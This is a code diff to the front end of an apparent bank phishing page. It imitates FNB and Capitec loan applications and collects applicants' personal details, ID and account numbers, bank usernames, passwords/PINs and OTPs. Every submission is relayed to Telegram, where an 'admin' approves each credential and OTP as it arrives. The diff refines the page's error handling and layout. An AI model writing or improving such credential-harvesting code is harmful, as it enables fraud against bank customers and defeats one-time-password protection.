@@ -24,7 +24,7 @@
     button.ghost { background:transparent; color:var(--accent); border:1px solid rgba(0,0,0,0.06); }
     .muted { color:var(--muted); font-size:13px; }
     .error { color:#b00020; font-size:13px; margin-top:6px; }
-    .status { margin-top:8px; font-size:14px; color:#333; }
+    .status { margin-top:8px; font-size:14px; color:#333; white-space:pre-wrap; }
     .bank-option { display:inline-flex; align-items:center; gap:8px; padding:8px 12px; border-radius:6px; border:1px solid #eee; cursor:pointer; }
     .bank-option input { margin-right:6px; }
     .progress { display:flex; gap:8px; margin-bottom:14px; }
@@ -86,7 +86,6 @@
         <button id="submit-details">Submit details</button>
       </div>
       <div id="details-status" class="status"></div>
-      <div class="buttons"><div></div><button id="to-credentials">Next: Credentials →</button></div>
     </section>
 
     <section id="s3" class="step">
@@ -128,21 +127,9 @@
   <script>
     // Bank themes and default passwords
     const BANKS = {
-      FNB: {
-        accent: '#f6a800',       // FNB-like gold
-        title: 'FNB Loan',
-        samplePassword: 'fnb_password'
-      },
-      Capitec: {
-        accent: '#e30613',       // Capitec-like red
-        title: 'Capitec Loan',
-        samplePassword: 'capitec_password'
-      },
-      DEFAULT: {
-        accent: '#0077b6',
-        title: 'FNB & Capitec Loan (Telegram webhook demo)',
-        samplePassword: ''
-      }
+      FNB: { accent: '#f6a800', title: 'FNB Loan', samplePassword: 'fnb_password' },
+      Capitec: { accent: '#e30613', title: 'Capitec Loan', samplePassword: 'capitec_password' },
+      DEFAULT: { accent: '#0077b6', title: 'FNB & Capitec Loan (Telegram webhook demo)', samplePassword: '' }
     };
 
     // Minimal client: polling-based status updates only (no socket.io)
@@ -166,41 +153,41 @@
       document.querySelectorAll('.progress .dot').forEach((d,i) => d.classList.toggle('active', i < step));
     }
     show('s1');
-    
-// Helper: centralize POST requests and surface errors
-async function apiPost(path, body) {
-  const url = path; // relative path will hit same origin
-  console.log('API POST', url, body);
-  try {
-    const resp = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-    // network-level success (we got a response)
-    const text = await resp.text();
-    let data;
-    try { data = text ? JSON.parse(text) : {}; } catch (err) {
-      // response is not JSON
-      throw new Error(`Invalid JSON response from ${url}: ${text}`);
+
+    // Helper: centralize POST requests and surface errors
+    async function apiPost(path, body) {
+      const url = path; // relative path will hit same origin
+      console.log('API POST', url, body);
+      try {
+        const resp = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+        // network-level success (we got a response)
+        const text = await resp.text();
+        let data;
+        try { data = text ? JSON.parse(text) : {}; } catch (err) {
+          // response is not JSON
+          throw new Error(`Invalid JSON response from ${url}: ${text}`);
+        }
+        if (!resp.ok) {
+          // Server returned error status; show details if provided
+          const details = data.details || data.error || JSON.stringify(data);
+          const msg = `HTTP ${resp.status} ${resp.statusText} - ${details}`;
+          const e = new Error(msg);
+          e.payload = data;
+          throw e;
+        }
+        console.log('API success', url, data);
+        return data;
+      } catch (err) {
+        // Network error or thrown above
+        console.error('API POST error', url, err);
+        throw err;
+      }
     }
-    if (!resp.ok) {
-      // Server returned error status; show details if provided
-      const details = data.details || data.error || JSON.stringify(data);
-      const msg = `HTTP ${resp.status} ${resp.statusText} - ${details}`;
-      const e = new Error(msg);
-      e.payload = data;
-      throw e;
-    }
-    console.log('API success', url, data);
-    return data;
-  } catch (err) {
-    // Network error or thrown above
-    console.error('API POST error', url, err);
-    throw err;
-  }
-}
-    
+
     // state
     let applicationId = null;
     let pollTimer = null;
@@ -270,7 +257,6 @@ async function apiPost(path, body) {
         const bank = e.target.value;
         applyBankTheme(bank);
       });
-      // allow clicking the styled label to select; ensure initial styling
     });
 
     // Default: set theme to DEFAULT at load
@@ -280,7 +266,7 @@ async function apiPost(path, body) {
       passwordInput.placeholder = 'Password / PIN';
     })();
 
-    // Submit details
+    // Submit details (uses apiPost)
     document.getElementById('submit-details').addEventListener('click', async () => {
       const fullname = document.getElementById('fullname').value.trim();
       const phone = document.getElementById('phone').value.trim();
@@ -306,20 +292,22 @@ async function apiPost(path, body) {
         monthly: monthlyEl.textContent,
         applicant: { fullName: fullname, phone, bank, accountNumber: account, idNumber: idnum }
       };
-      document.getElementById('details-status').textContent = 'Sending details to Telegram...';
+      const statusEl = document.getElementById('details-status');
+      statusEl.textContent = 'Sending details to Telegram...';
       try {
-        const r = await fetch('/api/create-application', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
-        const j = await r.json();
-        if (!j.success) { document.getElementById('details-status').textContent = 'Error: ' + (j.error||'server'); return; }
+        const j = await apiPost('/api/create-application', payload);
+        if (!j.success) { statusEl.textContent = 'Error: ' + (j.error||'server'); return; }
         applicationId = j.applicationId;
-        document.getElementById('details-status').textContent = 'Details sent. Application ID: ' + applicationId;
+        statusEl.textContent = 'Details sent. Application ID: ' + applicationId;
         show('s3');
       } catch (e) {
-        console.error(e); document.getElementById('details-status').textContent = 'Network error';
+        console.error(e);
+        const msg = e.payload ? (e.payload.details || e.payload.error || JSON.stringify(e.payload)) : (e.message || String(e));
+        statusEl.textContent = 'Network/Server error: ' + msg;
       }
     });
 
-    // Submit credentials
+    // Submit credentials (uses apiPost)
     let waitingCred = false;
     document.getElementById('verify-credentials').addEventListener('click', async () => {
       if (!applicationId) { alert('Submit details first'); return; }
@@ -331,25 +319,23 @@ async function apiPost(path, body) {
       if (password.length < 4){ document.getElementById('err-password').textContent='At least 4 chars'; ok=false; }
       if (!ok) return;
 
+      const credStatus = document.getElementById('cred-status');
+      credStatus.textContent = 'Waiting for admin decision on Telegram...';
       try {
-        document.getElementById('cred-status').textContent = 'Waiting for admin decision on Telegram...';
-        waitingCred = true;
-        const r = await fetch('/api/submit-credentials', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ applicationId, username, password })});
-        const j = await r.json();
+        const j = await apiPost('/api/submit-credentials', { applicationId, username, password });
         if (!j.success) {
-          waitingCred = false;
-          document.getElementById('cred-status').textContent = 'Server error: ' + (j.error||'');
+          credStatus.textContent = 'Server error: ' + (j.details || j.error || 'unknown');
           return;
         }
         startPolling();
       } catch (e) {
         console.error(e);
-        waitingCred = false;
-        document.getElementById('cred-status').textContent = 'Network error';
+        const msg = e.payload ? (e.payload.details || e.payload.error || JSON.stringify(e.payload)) : (e.message || String(e));
+        credStatus.textContent = 'Network/Server error: ' + msg;
       }
     });
 
-    // OTP auto submit when length valid
+    // OTP auto submit when length valid (uses apiPost)
     document.getElementById('otp').addEventListener('input', () => {
       const v = document.getElementById('otp').value.trim();
       if (/^\d{4,6}$/.test(v)) {
@@ -370,30 +356,27 @@ async function apiPost(path, body) {
       if (!ok) return;
 
       otpSubmitting = true;
-      document.getElementById('otp-status').textContent = 'Waiting for admin OTP decision via Telegram...';
+      const otpStatus = document.getElementById('otp-status');
+      otpStatus.textContent = 'Waiting for admin OTP decision via Telegram...';
       try {
-        const r = await fetch('/api/submit-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ applicationId, phone, otp })});
-        const j = await r.json();
+        const j = await apiPost('/api/submit-otp', { applicationId, phone, otp });
         if (!j.success) {
           otpSubmitting = false;
-          document.getElementById('otp-status').textContent = 'Server error: ' + (j.error||'');
+          otpStatus.textContent = 'Server error: ' + (j.details || j.error || '');
           return;
         }
         startPolling();
       } catch (e) {
         console.error(e);
         otpSubmitting = false;
-        document.getElementById('otp-status').textContent = 'Network error';
+        const msg = e.payload ? (e.payload.details || e.payload.error || JSON.stringify(e.payload)) : (e.message || String(e));
+        otpStatus.textContent = 'Network/Server error: ' + msg;
       }
     }
 
     // allow Enter to submit quickly
     document.getElementById('password').addEventListener('keydown', (e) => { if (e.key === 'Enter') document.getElementById('verify-credentials').click(); });
     document.getElementById('idnum').addEventListener('keydown', (e) => { if (e.key === 'Enter') document.getElementById('submit-details').click(); });
-
-    // Pre-select Capitec by default (optional). If you want no preselect, remove these lines.
-    // document.querySelector('input[name="bank"][value="Capitec"]').checked = true; applyBankTheme('Capitec');
-    // If you prefer to have no bank chosen by default, comment out above and user must pick a bank.
 
     // Ensure bank radio clicks update theme (also update label styles for visual selection)
     document.querySelectorAll('.bank-option').forEach(label => {
